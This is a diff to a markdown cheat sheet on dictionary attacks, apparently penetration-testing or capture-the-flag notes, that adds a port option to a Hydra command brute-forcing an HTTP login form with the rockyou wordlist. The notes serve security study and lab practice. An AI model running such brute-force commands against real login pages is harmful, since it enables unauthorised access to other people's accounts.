@@ -36,5 +36,5 @@ dictionary attack
 ## Http-Form
 http-post-form "login page : post data : error check"
 ```bash
-sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!" -s 80
 ```
